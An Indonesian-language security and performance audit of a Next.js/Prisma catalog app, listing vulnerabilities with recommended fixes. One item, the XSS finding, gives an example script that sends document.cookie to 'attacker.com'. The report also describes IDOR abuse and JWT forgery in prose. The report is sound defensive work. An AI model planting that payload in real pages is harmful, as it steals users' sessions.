# Analisis Kelemahan Proyek Katalogi 🛠️

Dokumen ini menyajikan hasil analisis menyeluruh terhadap seluruh komponen proyek **Katalogi** (aplikasi berbasis Next.js 16 App Router & Prisma). Analisis dibagi menjadi beberapa kategori utama: Keamanan (Security), Database & Performa, Validasi & Data Integrity, Arsitektur & Kualitas Kode, serta UI/UX.

---

## 1. Celah Keamanan Kritikal (Security Vulnerabilities)

### 🚨 Potensi XSS (Cross-Site Scripting) pada TextBlock
*   **Temuan**: Di file [TextBlock.tsx](file:///d:/Coolyah/Semester%204/Technopreneurship/katalogi/src/components/blocks/TextBlock.tsx#L21) dan [page.tsx](file:///d:/Coolyah/Semester%204/Technopreneurship/katalogi/src/app/(published)/[slug]/page.tsx#L116), terdapat penggunaan `dangerouslySetInnerHTML`.
*   **Kelemahan**: Data input HTML di dalam seksi teks (`TEXT` block) dirender langsung ke browser pengunjung tanpa disanitasi terlebih dahulu. Jika pengguna memasukkan kode script berbahaya (misal: `<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>`), script tersebut akan tereksekusi pada browser pengunjung katalog publik tersebut.
*   **Dampak**: Pencurian sesi (session hijacking), phishing, dan deface halaman katalog publik secara dinamis.
*   **Rekomendasi Solusi**: Gunakan pustaka sanitasi HTML seperti `isomorphic-dompurify` sebelum merender konten HTML pada client-side/server-side:
    ```typescript
    import DOMPurify from 'isomorphic-dompurify'
    const sanitizedHtml = DOMPurify.sanitize(html)
    ```

### 🔓 Ketiadaan Otorisasi pada Server Actions Blocks
*   **Temuan**: Fungsi Server Actions di [blocks.ts](file:///d:/Coolyah/Semester%204/Technopreneurship/katalogi/src/lib/actions/blocks.ts) seperti `addPageBlock`, `updatePageBlock`, `deletePageBlock`, dan `reorderBlocks` **tidak** melakukan pengecekan session (`requireAuth` atau verifikasi kepemilikan data) sama sekali.
*   **Kelemahan**: Semua mutasi data ini hanya bergantung pada parameter ID (`blockId` atau `websiteId`). Seseorang yang sudah login (atau bahkan tidak login, karena tidak ada validasi session di file ini) dapat memicu action ini lewat console/fetch dengan menebak ID (CUID) block milik user lain.
*   **Dampak**: Pengguna lain dapat mengedit, menambah, mengurutkan ulang, atau menghapus block katalog pengguna lain secara paksa (IDOR - Insecure Direct Object Reference).
*   **Rekomendasi Solusi**: Selalu periksa sesi pengguna dan kepemilikan website di dalam Server Actions sebelum memproses query database:
    ```typescript
    const session = await getSession();
    if (!session) throw new Error("Unauthorized");
    
    // Verifikasi kepemilikan
    const website = await prisma.website.findUnique({ where: { id: websiteId } });
    if (!website || website.userId !== session.userId) throw new Error("Unauthorized");
    ```

### 🔒 Insecure Direct Object Reference (IDOR) pada Pembuatan Website
*   **Temuan**: File [website.ts](file:///d:/Coolyah/Semester%204/Technopreneurship/katalogi/src/lib/actions/website.ts#L10) menerima parameter `userId` langsung dari argumen pemanggilan fungsi `createWebsite(userId, data)`. 
*   **Kelemahan**: Nilai `userId` diteruskan langsung dari client form [NewWebsiteForm.tsx](file:///d:/Coolyah/Semester%204/Technopreneurship/katalogi/src/components/dashboard/NewWebsiteForm.tsx#L11) (melalui props). User yang nakal bisa memanipulasi DOM/props client-side atau memicu Server Action secara manual dengan melempar `userId` milik pengguna lain.
*   **Dampak**: Pembuatan website atas nama akun pengguna lain tanpa persetujuan mereka.
*   **Rekomendasi Solusi**: Jangan kirimkan `userId` dari client-side. Ambil `userId` langsung dari server-session di dalam Server Action:
    ```typescript
    const session = await requireAuth();
    const userId = session.userId;
    ```

---

## 2. Kelemahan Database & Performa (Database & Performance)

### 📈 Potensi N+1 Query & Kurangnya Indexing pada Prisma Schema
*   **Temuan**:
    1. Schema database di [schema.prisma](file:///d:/Coolyah/Semester%204/Technopreneurship/katalogi/prisma/schema.prisma) tidak mendefinisikan index kustom pada kolom relasi/pencarian seperti `Website.userId` dan `PageBlock.websiteId`.
    2. Pencarian halaman publik di [page.tsx](file:///d:/Coolyah/Semester%204/Technopreneurship/katalogi/src/app/(published)/[slug]/page.tsx) menggunakan pencarian slug (`where: { slug }`).
*   **Kelemahan**: Tanpa indeks eksplisit, PostgreSQL akan melakukan *full table scan* ketika mencari block berdasarkan `websiteId` atau mencari website berdasarkan `slug` saat traffic publik melonjak.
*   **Dampak**: Degradasi performa query database secara eksponensial seiring bertambahnya jumlah data user, website, dan blocks.
*   **Rekomendasi Solusi**: Tambahkan blok `@@index` pada model Prisma:
    ```prisma
    model Website {
      // ...
      @@index([userId])
      @@index([slug])
    }
    model PageBlock {
      // ...
      @@index([websiteId])
    }
    ```

### 🔄 Konflik Caching di Halaman Publik
*   **Temuan**: Halaman [page.tsx](file:///d:/Coolyah/Semester%204/Technopreneurship/katalogi/src/app/(published)/[slug]/page.tsx#L13-L15) mendefinisikan `export const revalidate = 30` (untuk Incremental Static Regeneration - ISR) tetapi di baris berikutnya mendefinisikan `export const dynamic = 'force-dynamic'`.
*   **Kelemahan**: Opsi ini saling bertentangan. `force-dynamic` akan mematikan semua fitur static rendering/caching dan memaksa Next.js untuk merender ulang halaman pada setiap request (SSR penuh). Ini membuat konfigurasi `revalidate = 30` menjadi sia-sia.
*   **Dampak**: Menghilangkan keuntungan performa ISR. Server harus memproses koneksi DB ke Postgres dan merender ulang HTML penuh pada setiap kunjungan pelanggan katalog.
*   **Rekomendasi Solusi**: Jika ingin performa super cepat (scale-friendly untuk UMKM), hapus `force-dynamic` dan manfaatkan caching berbasis ISR dengan `revalidatePath` di Server Actions untuk melakukan on-demand revalidation ketika pengguna mengubah isi editor.

---

## 3. Kelemahan Validasi & Integritas Data (Validation & Data Integrity)

### 🖼️ Upload Foto Tanpa Validasi Tipe File (Insecure File Upload)
*   **Temuan**: File [upload.ts](file:///d:/Coolyah/Semester%204/Technopreneurship/katalogi/src/lib/upload.ts) menerima file langsung ke bucket Supabase. Validasi ekstensi file hanya memotong string nama file saja (`file.name.split('.').pop()`). Validasi ukuran file (5MB) hanya dilakukan di client-side di [BlockSettingsPanel.tsx](file:///d:/Coolyah/Semester%204/Technopreneurship/katalogi/src/components/editor/BlockSettingsPanel.tsx#L31).
*   **Kelemahan**:
    1. User jahat bisa langsung memanggil fungsi `uploadImage` lewat API/console dan mengunggah file non-gambar (seperti `.html` berisi script XSS, `.js`, atau malware) ke storage publik Supabase Anda.
    2. Ukuran file tidak divalidasi di backend, sehingga penyerang bisa mengunggah file berukuran sangat besar (misal: 100MB+) yang akan menghabiskan kuota Supabase Anda dengan sangat cepat.
*   **Dampak**: Eksploitasi server storage, tagihan cloud Supabase membengkak, dan penyebaran file berbahaya melalui domain web Anda.
*   **Rekomendasi Solusi**: Lakukan validasi tipe mime file (`file.type.startsWith('image/')`) dan ukuran file secara ketat di backend/Server Action sebelum melakukan upload ke Supabase.

### 🛡️ Validasi Schema JSON Block yang Lemah
*   **Temuan**: Kolom `content` di tabel `PageBlock` bertipe `Json`. Validasi schema saat insert/update (`updatePageBlock` di [blocks.ts](file:///d:/Coolyah/Semester%204/Technopreneurship/katalogi/src/lib/actions/blocks.ts#L42)) menerima `contentJSON: Record<string, unknown>` bertipe `any` tanpa validasi Zod schema yang didefinisikan di [validations.ts](file:///d:/Coolyah/Semester%204/Technopreneurship/katalogi/src/lib/validations.ts).
*   **Kelemahan**: Format JSON yang tidak valid atau properti yang hilang (seperti item catalog tanpa harga, hero tanpa headline) bisa lolos masuk ke database tanpa terfilter.
*   **Dampak**: Kerusakan UI/crash pada halaman publik saat merender block dengan skema JSON yang korup atau tidak valid (`TypeError: Cannot read properties of undefined`).
*   **Rekomendasi Solusi**: Terapkan validasi `pageBlockSchema.safeParse` di dalam Server Action sebelum melakukan operasi update di database.

---

## 4. Kelemahan Arsitektur & Ketergantungan (Architecture & Dependencies)

### 🗝️ Kebocoran Rahasia Keamanan (`fallback-secret-please-set-env`)
*   **Temuan**: Di [session.ts](file:///d:/Coolyah/Semester%204/Technopreneurship/katalogi/src/lib/session.ts#L13) kunci JWT menggunakan fallback string literal jika `SESSION_SECRET` tidak ada di environment variable.
*   **Kelemahan**: Jika environment variable tidak terkonfigurasi dengan benar di server production, aplikasi akan berjalan menggunakan fallback key publik tersebut.
*   **Dampak**: Penyerang dapat membuat cookie JWT sendiri dengan memalsukan `userId` siapa pun karena kunci enkripsinya diketahui umum (ditemukan di kode sumber repo).
*   **Rekomendasi Solusi**: Selalu lempar error jika variabel lingkungan yang krusial tidak diatur:
    ```typescript
    if (!process.env.SESSION_SECRET) {
      throw new Error('SESSION_SECRET is not configured in environment variables!');
    }
    ```

### 🐳 Manajemen Koneksi Database Pool
*   **Temuan**: Di [prisma.ts](file:///d:/Coolyah/Semester%204/Technopreneurship/katalogi/src/lib/prisma.ts#L9), pool postgres diinisialisasi ulang melalui `new pg.Pool({ connectionString })` setiap kali `createPrismaClient()` dipanggil.
*   **Kelemahan**: Walaupun ada global caching, jika instansiasi ini terjadi di serverless context (seperti Vercel), inisialisasi pool PostgreSQL ini bisa menyebabkan lonjakan jumlah koneksi aktif ke database (*Connection Exhaustion*).
*   **Dampak**: Error `Too many clients` di database Postgres, membuat web lumpuh seketika saat dikunjungi banyak orang.
*   **Rekomendasi Solusi**: Pertimbangkan menggunakan serverless connection pooling seperti *Prisma Accelerate* atau pgBouncer, dan atur batasan ukuran pool (`max: 10` atau lebih rendah) di konfigurasi `pg.Pool`.

---

## 5. Kelemahan UI/UX & Interaktivitas

### 🔔 Ketiadaan Feedback Simpan Otomatis (Auto-save Indicator)
*   **Temuan**: Perubahan pada seksi block (seperti mengetik di textarea Text Block atau input nama Catalog) langsung memicu `updatePageBlock` pada event `onBlur` (saat kursor keluar dari input).
*   **Kelemahan**: Dari perspektif user, tidak ada status indikator visual yang jelas bahwa data mereka sudah "berhasil disimpan" atau "sedang proses menyimpan" secara real-time pada panel editor (kecuali baris teks kecil "Menyimpan..." di bagian bawah panel). Hal ini memicu kecemasan pengguna apakah pekerjaan mereka hilang atau tidak.
*   **Dampak**: Pengguna bisa bingung dan menutup halaman secara tidak sengaja sebelum Server Action selesai memproses data.
*   **Rekomendasi Solusi**: Tambahkan status visual "Saved to Cloud" di area navbar editor yang menyala hijau saat berhasil tersimpan, atau berikan notifikasi toast (misal: React Hot Toast / Sonner toast) setelah sukses melakukan operasi database.

---

## Ringkasan Matriks Dampak & Prioritas Perbaikan

| No | Kelemahan | Kategori | Prioritas | Risiko | Status Perbaikan Rekomendasi |
| :--- | :--- | :--- | :--- | :--- | :--- |
| 1 | XSS di TextBlock (`dangerouslySetInnerHTML`) | Keamanan | **CRITICAL** | Sangat Tinggi | Harus segera disanitasi dengan DOMPurify |
| 2 | IDOR / Tanpa Otorisasi di Server Actions Blocks | Keamanan | **CRITICAL** | Sangat Tinggi | Tambahkan otorisasi session di backend |
| 3 | Insecure File Upload (Supabase Storage) | Keamanan | **HIGH** | Tinggi | Validasi tipe file & ukuran di backend |
| 4 | Fallback JWT Secret di `session.ts` | Keamanan | **HIGH** | Tinggi | Hapus fallback, wajibkan env variable |
| 5 | Konflik Caching `revalidate` vs `force-dynamic` | Performa | **MEDIUM** | Sedang | Optimalkan ISR untuk performa cepat |
| 6 | Kurangnya Database Indexing | DB | **MEDIUM** | Sedang | Tambahkan `@@index` di model Prisma |
| 7 | Caching DB Connection Pool | DB | **MEDIUM** | Sedang | Batasi jumlah pool koneksi Postgres |
| 8 | Minimnya Visual Feedback Auto-save | UI/UX | **LOW** | Rendah | Implementasikan status editor / Toast |

---

> [!IMPORTANT]
> **Rekomendasi Langkah Selanjutnya**: Prioritaskan perbaikan celah **Keamanan (1 & 2)** karena berpotensi merusak reputasi platform jika dieksploitasi oleh pihak luar. Setelah sistem aman, optimalkan bagian **Performa (5 & 6)** agar katalog yang dimuat oleh para pembeli/pelanggan UMKM dapat diakses dengan sangat instan dan ringan.
